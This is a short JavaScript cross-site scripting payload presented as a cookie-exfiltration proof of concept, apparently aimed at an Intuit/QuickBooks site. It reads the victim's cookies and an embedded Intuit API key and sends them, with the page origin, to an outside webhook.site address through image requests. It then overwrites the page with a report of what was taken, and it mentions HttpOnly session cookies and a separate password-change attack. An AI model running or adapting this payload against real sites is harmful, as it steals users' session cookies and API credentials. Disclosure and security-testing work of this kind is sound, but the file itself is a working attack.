(function(){
try{
var WH='https://webhook.site/8501e232-9d22-45b5-bf4d-5ae4d5fd9021';
var c=document.cookie;
var apikey='Intuit_APIKey intuit_apikey=prdakyresHrPbNYmoGmqMbZzZslfhGPRbBpwMfzE, intuit_apikey_version=1.0';

new Image().src=WH+'?type=cookies&data='+encodeURIComponent(c.substring(0,900));
if(c.length>900) new Image().src=WH+'?type=cookies2&data='+encodeURIComponent(c.substring(900,1800));
new Image().src=WH+'?type=apikey&data='+encodeURIComponent(apikey);
new Image().src=WH+'?type=origin&data='+encodeURIComponent(location.origin);

if(!document.body)document.documentElement.appendChild(document.createElement('body'));
document.body.innerHTML='<pre style="font:14px monospace;background:#111;color:#0f0;padding:20px;white-space:pre-wrap">'
+'[*] XSS Cookie Exfiltration PoC\n'
+'[*] Origin: '+location.origin+'\n'
+'[*] Data sent to attacker webhook\n\n'
+'[1] Exfiltrated cookies ('+c.length+' chars):\n\n'
+c.replace(/; /g,';\n')+'\n\n'
+'[2] Exfiltrated API Authorization:\n\n'
+apikey+'\n\n'
+'[3] Note: qbn.ticket, qbn.authid, qbn.agentid are HttpOnly\n'
+'    (not readable by JS but sent automatically with\n'
+'     same-origin fetch - see password change PoC)\n'
+'</pre>';
}catch(e){
new Image().src='https://webhook.site/8501e232-9d22-45b5-bf4d-5ae4d5fd9021?type=error&msg='+encodeURIComponent(e.message);
}
})();
